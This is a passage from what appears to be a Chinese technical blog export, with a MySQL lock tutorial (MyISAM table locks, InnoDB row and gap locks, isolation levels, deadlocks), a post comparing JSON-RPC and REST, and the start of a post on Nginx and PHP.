<tr>
<td>写锁</td>
<td>是</td>
<td>否</td>
<td>否</td>
</tr>
</tbody></table>
<p>可见，对ＭyISAM表的读操作，不会阻塞其他用户对同一表的读请求，但会阻塞对同一表的写请求；对ＭyISAM表的写操作，则会阻塞其他用户对同一表的读和写请求；ＭyISAM表的读和写操作之间，以及写和写操作之间是<strong>串行</strong>的！（<strong>当一线程获得对一个表的写锁后，只有持有锁的线程可以对表进行更新操作。其他线程的读、写操作都会等待，直到锁被释放为止。</strong>）</p>
<h3 id="如何加表锁"><a href="#如何加表锁" class="headerlink" title="如何加表锁"></a>如何加表锁</h3><p>MyISAM在执行查询语句（SELECT）前，会自动给涉及的所有表加读锁，在执行更新操作（UPDATE、DELETE、INSERT等）前，会自动给涉及的表加写锁，这个过程并不需要用户干预，因此用户一般不需要直接用LOCK TABLE命令给MyISAM表显式加锁。在本书的示例中，显式加锁基本上都是为了方便而已，并非必须如此。</p>
<p>给MyISAM表显示加锁，一般是为了一定程度模拟事务操作，实现对某一时间点多个表的一致性读取。例如，有一个订单表orders，其中记录有订单的总金额total，同时还有一个订单明细表order_detail，其中记录有订单每一产品的金额小计subtotal，假设我们需要检查这两个表的金额合计是否相等，可能就需要执行如下两条SQL：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(total) <span class="keyword">FROM</span> orders;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(subtotal) <span class="keyword">FROM</span> order_detail;</span><br></pre></td></tr></table></figure>

<p>这时，如果不先给这两个表加锁，就可能产生错误的结果，因为第一条语句执行过程中，order_detail表可能已经发生了改变。因此，正确的方法应该是：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LOCK</span> <span class="keyword">tables</span> orders <span class="keyword">read</span> <span class="keyword">local</span>,order_detail <span class="keyword">read</span> <span class="keyword">local</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SUM(total) <span class="keyword">FROM</span> orders;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SUM(subtotal) <span class="keyword">FROM</span> order_detail;</span><br><span class="line"></span><br><span class="line">Unlock <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>

<p>要特别说明以下两点内容。</p>
<ul>
<li>上面的例子在LOCK TABLES时加了‘local’选项，其作用就是在满足MyISAM表并发插入条件的情况下，允许其他用户在表尾插入记录</li>
<li>在用LOCKTABLES给表显式加表锁是时，必须同时取得所有涉及表的锁，并且MySQL支持锁升级。也就是说，在执行LOCK TABLES后，只能访问显式加锁的这些表，不能访问未加锁的表；同时，如果加的是读锁，那么只能执行查询操作，而不能执行更新操作。其实，在自动加锁的情况下也基本如此，MySQL问题一次获得SQL语句所需要的全部锁。这也正是MyISAM表不会出现死锁（Deadlock Free）的原因</li>
</ul>
<p>一个session使用LOCK TABLE 命令给表film_text加了读锁，这个session可以查询锁定表中的记录，但更新或访问其他表都会提示错误；同时，另外一个session可以查询表中的记录，但更新就会出现锁等待。</p>
<p>当使用LOCK TABLE时，不仅需要一次锁定用到的所有表，而且，同一个表在SQL语句中出现多少次，就要通过与SQL语句中相同的别名锁多少次，否则也会出错！</p>
<h3 id="并发锁"><a href="#并发锁" class="headerlink" title="并发锁"></a>并发锁</h3><p>在一定条件下，MyISAM也支持查询和操作的并发进行。</p>
<p>MyISAM存储引擎有一个系统变量concurrent_insert，专门用以控制其并发插入的行为，其值分别可以为0、1或2。</p>
<ul>
<li>当concurrent_insert设置为0时，不允许并发插入。</li>
<li>当concurrent_insert设置为1时，如果MyISAM允许在一个读表的同时，另一个进程从表尾插入记录。这也是MySQL的默认设置。</li>
<li>当concurrent_insert设置为2时，无论MyISAM表中有没有空洞，都允许在表尾插入记录，都允许在表尾并发插入记录。</li>
</ul>
<p>可以利用MyISAM存储引擎的并发插入特性，来解决应用中对同一表查询和插入锁争用。例如，将concurrent_insert系统变量为2，总是允许并发插入；同时，通过定期在系统空闲时段执行OPTIONMIZE TABLE语句来整理空间碎片，收到因删除记录而产生的中间空洞。</p>
<h3 id="MyISAM的锁调度"><a href="#MyISAM的锁调度" class="headerlink" title="MyISAM的锁调度"></a>MyISAM的锁调度</h3><p>前面讲过，MyISAM存储引擎的读和写锁是互斥，读操作是串行的。那么，一个进程请求某个MyISAM表的读锁，同时另一个进程也请求同一表的写锁，MySQL如何处理呢？答案是写进程先获得锁。不仅如此，即使读进程先请求先到锁等待队列，写请求后到，写锁也会插到读请求之前！这是因为MySQL认为写请求一般比读请求重要。这也正是MyISAM表不太适合于有大量更新操作和查询操作应用的原因，因为，大量的更新操作会造成查询操作很难获得读锁，从而可能永远阻塞。这种情况有时可能会变得非常糟糕！幸好我们可以通过一些设置来调节MyISAM的调度行为。</p>
<ul>
<li>通过指定启动参数low-priority-updates，使MyISAM引擎默认给予读请求以优先的权利。</li>
<li>通过执行命令SET LOW_PRIORITY_UPDATES&#x3D;1，使该连接发出的更新请求优先级降低。</li>
<li>通过指定INSERT、UPDATE、DELETE语句的LOW_PRIORITY属性，降低该语句的优先级。</li>
</ul>
<p>虽然上面3种方法都是要么更新优先，要么查询优先的方法，但还是可以用其来解决查询相对重要的应用（如用户登录系统）中，读锁等待严重的问题。</p>
<p>另外，MySQL也提供了一种折中的办法来调节读写冲突，即给系统参数max_write_lock_count设置一个合适的值，当一个表的读锁达到这个值后，MySQL变暂时将写请求的优先级降低，给读进程一定获得锁的机会。</p>
<p>上面已经讨论了写优先调度机制和解决办法。这里还要强调一点：一些需要长时间运行的查询操作，也会使写进程“饿死”！因此，应用中应尽量避免出现长时间运行的查询操作，不要总想用一条SELECT语句来解决问题。因为这种看似巧妙的SQL语句，往往比较复杂，执行时间较长，在可能的情况下可以通过使用中间表等措施对SQL语句做一定的“分解”，使每一步查询都能在较短时间完成，从而减少锁冲突。如果复杂查询不可避免，应尽量安排在数据库空闲时段执行，比如一些定期统计可以安排在夜间执行。</p>
<hr>
<h2 id="InnoDB锁问题"><a href="#InnoDB锁问题" class="headerlink" title="InnoDB锁问题"></a>InnoDB锁问题</h2><p>InnoDB与MyISAM的最大不同有两点：一是支持事务（TRANSACTION）；二是采用了行级锁。</p>
<p>行级锁和表级锁本来就有许多不同之处，另外，事务的引入也带来了一些新问题。</p>
<h3 id="1-事务（Transaction）及其ACID属性"><a href="#1-事务（Transaction）及其ACID属性" class="headerlink" title="1.事务（Transaction）及其ACID属性"></a>1.事务（Transaction）及其ACID属性</h3><p>事务是由一组SQL语句组成的逻辑处理单元，事务具有4属性，通常称为事务的ACID属性。</p>
<ul>
<li>原性性（Actomicity）：事务是一个原子操作单元，其对数据的修改，要么全都执行，要么全都不执行。</li>
<li>一致性（Consistent）：在事务开始和完成时，数据都必须保持一致状态。这意味着所有相关的数据规则都必须应用于事务的修改，以操持完整性；事务结束时，所有的内部数据结构（如B树索引或双向链表）也都必须是正确的。</li>
<li>隔离性（Isolation）：数据库系统提供一定的隔离机制，保证事务在不受外部并发操作影响的“独立”环境执行。这意味着事务处理过程中的中间状态对外部是不可见的，反之亦然。</li>
<li>持久性（Durable）：事务完成之后，它对于数据的修改是永久性的，即使出现系统故障也能够保持。</li>
</ul>
<h3 id="2-并发事务带来的问题"><a href="#2-并发事务带来的问题" class="headerlink" title="2.并发事务带来的问题"></a>2.并发事务带来的问题</h3><p>相对于串行处理来说，并发事务处理能大大增加数据库资源的利用率，提高数据库系统的事务吞吐量，从而可以支持可以支持更多的用户。但并发事务处理也会带来一些问题，主要包括以下几种情况。</p>
<ul>
<li><strong>更新丢失</strong>（Lost Update）：当两个或多个事务选择同一行，然后基于最初选定的值更新该行时，由于每个事务都不知道其他事务的存在，就会发生丢失更新问题——最后的更新覆盖了其他事务所做的更新。例如，两个编辑人员制作了同一文档的电子副本。每个编辑人员独立地更改其副本，然后保存更改后的副本，这样就覆盖了原始文档。最后保存其更改保存其更改副本的编辑人员覆盖另一个编辑人员所做的修改。如果在一个编辑人员完成并提交事务之前，另一个编辑人员不能访问同一文件，则可避免此问题</li>
<li><strong>脏读</strong>（Dirty Reads）：一个事务正在对一条记录做修改，在这个事务并提交前，这条记录的数据就处于不一致状态；这时，另一个事务也来读取同一条记录，如果不加控制，第二个事务读取了这些“脏”的数据，并据此做进一步的处理，就会产生未提交的数据依赖关系。这种现象被形象地叫做“脏读”。</li>
<li><strong>不可重复读</strong>（Non-Repeatable Reads）：一个事务在读取某些数据已经发生了改变、或某些记录已经被删除了！这种现象叫做“不可重复读”。</li>
<li><strong>幻读</strong>（Phantom Reads）：一个事务按相同的查询条件重新读取以前检索过的数据，却发现其他事务插入了满足其查询条件的新数据，这种现象就称为“幻读”。</li>
</ul>
<h3 id="3-事务隔离级别"><a href="#3-事务隔离级别" class="headerlink" title="3.事务隔离级别"></a>3.事务隔离级别</h3><p>在并发事务处理带来的问题中，“更新丢失”通常应该是完全避免的。但防止更新丢失，并不能单靠数据库事务控制器来解决，需要应用程序对要更新的数据<strong>加必要的锁</strong>来解决，因此，防止更新丢失应该是应用的责任。</p>
<p>“脏读”、“不可重复读”和“幻读”，其实都是数据库读一致性问题，必须由数据库提供一定的事务隔离机制来解决。数据库实现事务隔离的方式，基本可以分为以下两种。</p>
<p>一种是在读取数据前，对其加锁，阻止其他事务对数据进行修改。</p>
<p>另一种是不用加任何锁，通过一定机制生成一个数据请求时间点的一致性数据快照（Snapshot），并用这个快照来提供一定级别（语句级或事务级）的一致性读取。从用户的角度，好像是数据库可以提供同一数据的多个版本，因此，这种技术叫做数据多版本并发控制（ＭultiVersion Concurrency Control，简称MVCC或MCC），也经常称为多版本数据库。</p>
<p>数据库的事务隔离级别越严格，并发副作用越小，但付出的代价也就越大，因为事务隔离实质上就是使事务在一定程度上“串行化”进行，这显然与“并发”是矛盾的，同时，不同的应用对读一致性和事务隔离程度的要求也是不同的，比如许多应用对“不可重复读”和“幻读”并不敏感，可能更关心数据并发访问的能力。</p>
<p>为了解决“隔离”与“并发”的矛盾，ISO&#x2F;ANSI SQL92定义了４个事务隔离级别，每个级别的隔离程度不同，允许出现的副作用也不同，应用可以根据自己业务逻辑要求，通过选择不同的隔离级别来平衡＂隔离＂与＂并发＂的矛盾</p>
<h4 id="事务４种隔离级别比较"><a href="#事务４种隔离级别比较" class="headerlink" title="事务４种隔离级别比较"></a>事务４种隔离级别比较</h4><table>
<thead>
<tr>
<th>隔离级别&#x2F;读数据一致性及允许的并发副作用</th>
<th>读数据一致性</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>未提交读（Read uncommitted）</td>
<td>最低级别，只能保证不读取物理上损坏的数据</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>已提交度（Read committed）</td>
<td>语句级</td>
<td>否</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>可重复读（Repeatable read）</td>
<td>事务级</td>
<td>否</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>可序列化（Serializable）</td>
<td>最高级别，事务级</td>
<td>否</td>
<td>否</td>
<td>否</td>
</tr>
</tbody></table>
<p>最后要说明的是：各具体数据库并不一定完全实现了上述４个隔离级别，例如，Oracle只提供Read committed和Serializable两个标准级别，另外还自己定义的Read only隔离级别：SQL Server除支持上述ISO&#x2F;ANSI SQL92定义的４个级别外，还支持一个叫做＂快照＂的隔离级别，但严格来说它是一个用MVCC实现的Serializable隔离级别。ＭySQL支持全部４个隔离级别，但在具体实现时，有一些特点，比如在一些隔离级下是采用MVCC一致性读，但某些情况又不是。</p>
<h3 id="获取InonoD行锁争用情况"><a href="#获取InonoD行锁争用情况" class="headerlink" title="获取InonoD行锁争用情况"></a>获取InonoD行锁争用情况</h3><p>可以通过检查InnoDB_row_lock状态变量来分析系统上的行锁的争夺情况：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">mysql&gt; show status like &#x27;innodb_row_lock%&#x27;;</span><br><span class="line"></span><br><span class="line">+-------------------------------+-------+</span><br><span class="line"></span><br><span class="line">|<span class="string"> Variable_name </span>|<span class="string"> Value </span>|</span><br><span class="line"></span><br><span class="line">+-------------------------------+-------+</span><br><span class="line"></span><br><span class="line">|<span class="string"> Innodb_row_lock_current_waits </span>|<span class="string"> 0 </span>|</span><br><span class="line"></span><br><span class="line">|<span class="string"> Innodb_row_lock_time </span>|<span class="string"> 0 </span>|</span><br><span class="line"></span><br><span class="line">|<span class="string"> Innodb_row_lock_time_avg </span>|<span class="string"> 0 </span>|</span><br><span class="line"></span><br><span class="line">|<span class="string"> Innodb_row_lock_time_max </span>|<span class="string"> 0 </span>|</span><br><span class="line"></span><br><span class="line">|<span class="string"> Innodb_row_lock_waits </span>|<span class="string"> 0 </span>|</span><br><span class="line"></span><br><span class="line">+-------------------------------+-------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>如果发现争用比较严重，如Innodb_row_lock_waits和Innodb_row_lock_time_avg的值比较高，还可以通过设置InnoDB Monitors来进一步观察发生锁冲突的表、数据行等，并分析锁争用的原因。</p>
<h3 id="InnoDB的行锁模式及加锁方法"><a href="#InnoDB的行锁模式及加锁方法" class="headerlink" title="InnoDB的行锁模式及加锁方法"></a>InnoDB的行锁模式及加锁方法</h3><p>InnoDB实现了以下两种类型的行锁。</p>
<ul>
<li>共享锁（s）：允许一个事务去读一行，阻止其他事务获得相同数据集的排他锁。</li>
<li>排他锁（Ｘ）：允许获取排他锁的事务更新数据，阻止其他事务取得相同的数据集共享读锁和排他写锁。</li>
</ul>
<p>另外，为了允许行锁和表锁共存，实现多粒度锁机制，InnoDB还有两种内部使用的意向锁（Intention Locks），这两种意向锁都是表锁。</p>
<p>意向共享锁（IS）：事务打算给数据行共享锁，事务在给一个数据行加共享锁前必须先取得该表的IS锁。</p>
<p>意向排他锁（IX）：事务打算给数据行加排他锁，事务在给一个数据行加排他锁前必须先取得该表的IX锁。</p>
<h4 id="InnoDB行锁模式兼容性列表"><a href="#InnoDB行锁模式兼容性列表" class="headerlink" title="InnoDB行锁模式兼容性列表"></a>InnoDB行锁模式兼容性列表</h4><table>
<thead>
<tr>
<th>当前锁模式&#x2F;是否兼容&#x2F;请求锁模式</th>
<th>X</th>
<th>IX</th>
<th>S</th>
<th>IS</th>
</tr>
</thead>
<tbody><tr>
<td>X</td>
<td>冲突</td>
<td>冲突</td>
<td>冲突</td>
<td>冲突</td>
</tr>
<tr>
<td>IX</td>
<td>冲突</td>
<td>兼容</td>
<td>冲突</td>
<td>兼容</td>
</tr>
<tr>
<td>S</td>
<td>冲突</td>
<td>冲突</td>
<td>兼容</td>
<td>兼容</td>
</tr>
<tr>
<td>IS</td>
<td>冲突</td>
<td>兼容</td>
<td>兼容</td>
<td>兼容</td>
</tr>
</tbody></table>
<p>如果一个事务请求的锁模式与当前的锁兼容，InnoDB就请求的锁授予该事务；反之，如果两者两者不兼容，该事务就要等待锁释放。</p>
<p>意向锁是InnoDB自动加的，不需用户干预。对于UPDATE、DELETE和INSERT语句，InnoDB会自动给涉及及数据集加排他锁（Ｘ）；对于普通SELECT语句，InnoDB会自动给涉及数据集加排他锁（Ｘ）；对于普通SELECT语句，InnoDB不会任何锁；事务可以通过以下语句显示给记录集加共享锁或排锁。</p>
<p>共享锁（Ｓ）：<code>SELECT * FROM table_name WHERE ... LOCK IN SHARE MODE</code></p>
<p>排他锁（X）：<code>SELECT * FROM table_name WHERE ... FOR UPDATE</code></p>
<p>用SELECT .. IN SHARE MODE获得共享锁，主要用在需要数据依存关系时确认某行记录是否存在，并确保没有人对这个记录进行UPDATE或者DELETE操作。但是如果当前事务也需要对该记录进行更新操作，则很有可能造成死锁，对于锁定行记录后需要进行更新操作的应用，应该使用SELECT … FOR UPDATE方式获取排他锁。</p>
<h3 id="InnoDB行锁实现方式"><a href="#InnoDB行锁实现方式" class="headerlink" title="InnoDB行锁实现方式"></a>InnoDB行锁实现方式</h3><p>InnoDB行锁是通过索引上的索引项来实现的，这一点ＭySQL与Oracle不同，后者是通过在数据中对相应数据行加锁来实现的。InnoDB这种行锁实现特点意味者：只有通过索引条件检索数据，InnoDB才会使用行级锁，否则，InnoDB将使用表锁！</p>
<p>在实际应用中，要特别注意InnoDB行锁的这一特性，不然的话，可能导致大量的锁冲突，从而影响并发性能。</p>
<h3 id="间隙锁（Next-Key锁）"><a href="#间隙锁（Next-Key锁）" class="headerlink" title="间隙锁（Next-Key锁）"></a>间隙锁（Next-Key锁）</h3><p>当我们用范围条件而不是相等条件检索数据，并请求共享或排他锁时，InnoDB会给符合条件的已有数据的索引项加锁；对于键值在条件范围内但并不存在的记录，叫做“间隙(GAP)”，InnoDB也会对这个“间隙”加锁，这种锁机制不是所谓的间隙锁（Next-Key锁）。</p>
<p>举例来说，假如emp表中只有101条记录，其empid的值分别是1,2,…,100,101，下面的SQL：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> empid &gt; <span class="number">100</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span></span><br></pre></td></tr></table></figure>

<p>是一个范围条件的检索，InnoDB不仅会对符合条件的empid值为101的记录加锁，也会对empid大于101（这些记录并不存在）的“间隙”加锁。</p>
<p>InnoDB使用间隙锁的目的，一方面是为了防止幻读，以满足相关隔离级别的要求，对于上面的例子，要是不使用间隙锁，如果其他事务插入了empid大于100的任何记录，那么本事务如果再次执行上述语句，就会发生幻读；另一方面，是为了满足其恢复和复制的需要。有关其恢复和复制对机制的影响，以及不同隔离级别下InnoDB使用间隙锁的情况。</p>
<p>很显然，在使用范围条件检索并锁定记录时，InnoDB这种加锁机制会阻塞符合条件范围内键值的并发插入，这往往会造成严重的锁等待。因此，在实际开发中，尤其是并发插入比较多的应用，我们要尽量优化业务逻辑，尽量使用相等条件来访问更新数据，避免使用范围条件。</p>
<h3 id="什么时候使用表锁"><a href="#什么时候使用表锁" class="headerlink" title="什么时候使用表锁"></a>什么时候使用表锁</h3><p>对于InnoDB表，在绝大部分情况下都应该使用行级锁，因为事务和行锁往往是我们之所以选择InnoDB表的理由。但在个另特殊事务中，也可以考虑使用表级锁。</p>
<ul>
<li>第一种情况是：事务需要更新大部分或全部数据，表又比较大，如果使用默认的行锁，不仅这个事务执行效率低，而且可能造成其他事务长时间锁等待和锁冲突，这种情况下可以考虑使用表锁来提高该事务的执行速度。</li>
<li>第二种情况是：事务涉及多个表，比较复杂，很可能引起死锁，造成大量事务回滚。这种情况也可以考虑一次性锁定事务涉及的表，从而避免死锁、减少数据库因事务回滚带来的开销。</li>
</ul>
<p>当然，应用中这两种事务不能太多，否则，就应该考虑使用ＭyISAＭ表。</p>
<p>在InnoDB下 ，使用表锁要注意以下两点。</p>
<p>    （１）使用LOCK TALBES虽然可以给InnoDB加表级锁，但必须说明的是，表锁不是由InnoDB存储引擎层管理的，而是由其上一层ＭySQL Server负责的，仅当autocommit&#x3D;0、innodb_table_lock&#x3D;1（默认设置）时，InnoDB层才能知道MySQL加的表锁，ＭySQL Server才能感知InnoDB加的行锁，这种情况下，InnoDB才能自动识别涉及表级锁的死锁；否则，InnoDB将无法自动检测并处理这种死锁。</p>
<p>    （２）在用LOCAK TABLES对InnoDB锁时要注意，要将AUTOCOMMIT设为0，否则ＭySQL不会给表加锁；事务结束前，不要用UNLOCAK TABLES释放表锁，因为UNLOCK TABLES会隐含地提交事务；COMMIT或ROLLBACK产不能释放用LOCAK TABLES加的表级锁，必须用UNLOCK TABLES释放表锁，正确的方式见如下语句。</p>
<p>例如，如果需要写表t1并从表t读，可以按如下做：</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> AUTOCOMMIT=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">LOCAK TABLES t1 <span class="keyword">WRITE</span>, t2 <span class="keyword">READ</span>, ...;</span><br><span class="line"></span><br><span class="line">[<span class="keyword">do</span> something <span class="keyword">with</span> tables t1 <span class="keyword">and</span> here];</span><br><span class="line"></span><br><span class="line">COMMIT;</span><br><span class="line"></span><br><span class="line">UNLOCK TABLES;</span><br></pre></td></tr></table></figure>

<h3 id="关于死锁"><a href="#关于死锁" class="headerlink" title="关于死锁"></a>关于死锁</h3><p>ＭyISAM表锁是deadlock free的，这是因为ＭyISAM总是一次性获得所需的全部锁，要么全部满足，要么等待，因此不会出现死锁。但是在InnoDB中，除单个SQL组成的事务外，锁是逐步获得的，这就决定了InnoDB发生死锁是可能的。</p>
<p>发生死锁后，InnoDB一般都能自动检测到，并使一个事务释放锁并退回，另一个事务获得锁，继续完成事务。但在涉及外部锁，或涉及锁的情况下，InnoDB并不能完全自动检测到死锁，这需要通过设置锁等待超时参数innodb_lock_wait_timeout来解决。需要说明的是，这个参数并不是只用来解决死锁问题，在并发访问比较高的情况下，如果大量事务因无法立即获取所需的锁而挂起，会占用大量计算机资源，造成严重性能问题，甚至拖垮数据库。我们通过设置合适的锁等待超时阈值，可以避免这种情况发生。</p>
<p>通常来说，死锁都是应用设计的问题，通过调整业务流程、数据库对象设计、事务大小、以及访问数据库的SQL语句，绝大部分都可以避免。下面就通过实例来介绍几种死锁的常用方法。</p>
<p>    （１）在应用中，如果不同的程序会并发存取多个表，应尽量约定以相同的顺序为访问表，这样可以大大降低产生死锁的机会。如果两个session访问两个表的顺序不同，发生死锁的机会就非常高！但如果以相同的顺序来访问，死锁就可能避免。</p>
<p>    （２）在程序以批量方式处理数据的时候，如果事先对数据排序，保证每个线程按固定的顺序来处理记录，也可以大大降低死锁的可能。</p>
<p>    （３）在事务中，如果要更新记录，应该直接申请足够级别的锁，即排他锁，而不应该先申请共享锁，更新时再申请排他锁，甚至死锁。</p>
<p>    （４）在REPEATEABLE-READ隔离级别下，如果两个线程同时对相同条件记录用SELECT…ROR UPDATE加排他锁，在没有符合该记录情况下，两个线程都会加锁成功。程序发现记录尚不存在，就试图插入一条新记录，如果两个线程都这么做，就会出现死锁。这种情况下，将隔离级别改成READ COMMITTED，就可以避免问题。</p>
<p>    （５）当隔离级别为READ COMMITED时，如果两个线程都先执行SELECT…FOR UPDATE，判断是否存在符合条件的记录，如果没有，就插入记录。此时，只有一个线程能插入成功，另一个线程会出现锁等待，当第１个线程提交后，第２个线程会因主键重出错，但虽然这个线程出错了，却会获得一个排他锁！这时如果有第３个线程又来申请排他锁，也会出现死锁。对于这种情况，可以直接做插入操作，然后再捕获主键重异常，或者在遇到主键重错误时，总是执行ROLLBACK释放获得的排他锁。</p>
<p>尽管通过上面的设计和优化等措施，可以大减少死锁，但死锁很难完全避免。因此，在程序设计中总是捕获并处理死锁异常是一个很好的编程习惯。</p>
<p>如果出现死锁，可以用SHOW INNODB STATUS命令来确定最后一个死锁产生的原因和改进措施。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于<strong>ＭyISAM</strong>的表锁，主要有以下几点</p>
<p>    （１）共享读锁（S）之间是兼容的，但共享读锁（S）和排他写锁（X）之间，以及排他写锁之间（X）是互斥的，也就是说读和写是串行的。</p>
<p>    （２）在一定条件下，ＭyISAM允许查询和插入并发执行，我们可以利用这一点来解决应用中对同一表和插入的锁争用问题。</p>
<p>    （３）ＭyISAM默认的锁调度机制是写优先，这并不一定适合所有应用，用户可以通过设置LOW_PRIPORITY_UPDATES参数，或在INSERT、UPDATE、DELETE语句中指定LOW_PRIORITY选项来调节读写锁的争用。</p>
<p>    （４）由于表锁的锁定粒度大，读写之间又是串行的，因此，如果更新操作较多，ＭyISAM表可能会出现严重的锁等待，可以考虑采用InnoDB表来减少锁冲突。</p>
<p>对于<strong>InnoDB</strong>表，主要有以下几点</p>
<p>    （１）InnoDB的行销是基于索引实现的，如果不通过索引访问数据，InnoDB会使用表锁。</p>
<p>    （２）InnoDB间隙锁机制，以及InnoDB使用间隙锁的原因。</p>
<p>    （３）在不同的隔离级别下，InnoDB的锁机制和一致性读策略不同。</p>
<p>    （４）ＭySQL的恢复和复制对InnoDB锁机制和一致性读策略也有较大影响。</p>
<p>    （５）锁冲突甚至死锁很难完全避免。</p>
<p>在了解InnoDB的锁特性后，用户可以通过设计和SQL调整等措施减少锁冲突和死锁，包括：</p>
<ul>
<li>尽量使用较低的隔离级别</li>
<li>精心设计索引，并尽量使用索引访问数据，使加锁更精确，从而减少锁冲突的机会。</li>
<li>选择合理的事务大小，小事务发生锁冲突的几率也更小。</li>
<li>给记录集显示加锁时，最好一次性请求足够级别的锁。比如要修改数据的话，最好直接申请排他锁，而不是先申请共享锁，修改时再请求排他锁，这样容易产生死锁。</li>
<li>不同的程序访问一组表时，应尽量约定以相同的顺序访问各表，对一个表而言，尽可能以固定的顺序存取表中的行。这样可以大减少死锁的机会。</li>
<li>尽量用相等条件访问数据，这样可以避免间隙锁对并发插入的影响。</li>
<li>不要申请超过实际需要的锁级别；除非必须，查询时不要显示加锁。</li>
<li>对于一些特定的事务，可以使用表锁来提高处理速度或减少死锁的可能。</li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>WEB 开发中，使用 JSON-RPC 好，还是 RESTful 好？</title>
    <url>/2018/03/network-api/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>两者没有高下之分，无非是一种约定俗成的标准。习惯用 RPC 就用 RPC，能理解 REST 就用 REST。</p>
<p>JSON-RPC 比较符合直观，格式也相对宽松；</p>
<span id="more"></span>

<p>REST 最近正流行，有自己的一套设计规范。</p>
<p>REST 面对的疑问跟当年刚开始流行面向对象时的情况是一样的。</p>
<p>它适合很多情况，但并不适合所有情况。</p>
<p>最差的结果就是盲目跟风，又对 REST 的概念和理念一知半解，最后搞出一个半吊子的怪胎，还自我标榜用了流行的 RESTful API。</p>
<hr>
<p>REST 是一种设计风格，它的很多思维方式与 RPC 是完全冲突的。</p>
<p>RPC 的思想是把本地函数映射到 API，也就是说一个 API 对应的是一个 function，我本地有一个 getAllUsers，远程也能通过某种约定的协议来调用这个 getAllUsers。至于这个协议是 Socket、是 HTTP 还是别的什么并不重要；</p>
<p>RPC 中的主体都是动作，是个动词，表示我要做什么。</p>
<p>而 REST 则不然，它的 URL 主体是资源，是个名词。而且也仅支持 HTTP 协议，规定了使用 HTTP Method 表达本次要做的动作，类型一般也不超过那四五种。这些动作表达了对资源仅有的几种转化方式。</p>
<hr>
<p>这种设计思路是反程序员直觉的，因为在本地业务代码中仍然是一个个的函数，是动作，但表现在接口形式上则完全是资源的形式。</p>
<p>就像面向对象的「万物皆对象」理论在习惯了纯粹面向过程开发的程序员眼里显得十分别扭一样：我的代码本来就是按顺序、循环、分支这么运行的啊，为啥非得在很明确的结构上封装一层一层的基类子类接口，还要故意给两个函数起同一个名字，调用时才选择用哪一个呢？</p>
<hr>
<p>使用「万物皆资源」的思想编写实际项目中的 API 接口时，最常见的问题就是「这玩意到底是个什么资源？……………… 算了，我就直接写吧，不管什么风格了」</p>
<pre><code>比如，login 和 logout 应该怎么 REST 化？
比如，多条件复合搜索在 GET 里写不下怎么办？
比如，大量资源的删除难道要写几千个 DELETE？
</code></pre>
<p>其实在理解了 REST 后，这些都不是什么无解的难题，只是思维方式要转换一下：</p>
<pre><code>login 和 logout 其实只是对 session 资源的创建和删除；
search 本身就是个资源，使用 POST 创建，如果不需持久化，可以直接在 Response 中返回结果，如果需要（如翻页、长期缓存等），直接保存搜索结果并 303 跳转到资源地址就行了；
id 多到连 url 都写不下的请求，应该创建 task，用 GET 返回 task 状态甚至执行进度；
…… 等等等。
</code></pre>
<hr>
<p>如果只是规定了一种规范，却不理解它表相下面的思维方式，实施中又按照自己的理解随意变动，那结果肯定是混乱不堪的。</p>
<p>当然，API 怎么写是开发者的自由。但如果一个 API 在 url 里放一堆动词、资源设计混乱、各种乱用 HTTP Method 和 Status Code，还自称 RESTful API 的话，那就像你养了一条狗，还管它叫猫一样。</p>
<p>这种混搭产物，不如叫它 REFU 吧。</p>
<p>（Remove Extension From Url：从 url 里去掉文件扩展名）</p>
<hr>
<p>前面说了半天 REST 的理念和不懂 REST 造成的问题，但是，这并不代表 REST 比 RPC 更「高等」，更不是说不理解 REST 的人是落伍的。</p>
<p>所谓代码风格、接口形式、各种林林总总的格式规定，其实都是为了在团队内部形成共识、防止个人习惯差异引起的混乱。JSON-RPC 当然也是有规范的，但相比 REST 实在宽松太多了。</p>
<p>如果一个开发团队规定必须在 url 里写 action，所有请求都是 POST，可以吗？当然也没问题，只是不要拿出去标榜自己写的是 RESTful API 就行。</p>
<p>规范最终还是为了开发者和软件产品服务的，如果它能带来便利、减少混乱，就值得用；反之，如果带来的麻烦比解决的还多，那就犯不上纯粹跟风追流行了。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>JSON-RPC</tag>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title>你确定你真的懂 Nginx 与 PHP 的交互？</title>
    <url>/2018/03/nginx-php/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Nginx 是俄国人最早开发的 Webserver 现在已经风靡全球，相信大家并不陌生。PHP 也通过二十多年的发展来到了 7 系列版本，更加关注性能。这对搭档在最近这些年，叱咤风云，基本上 LNMP 成了当下的标配。</p>
<p>可是，你用了这么多年的 Nginx+PHP 的搭配，你真正知道他们之间是怎么交互怎么通信的么？作为一道常常用来面试的考题，从过往经验看，情况并不乐观。</p>
<span id="more"></span>

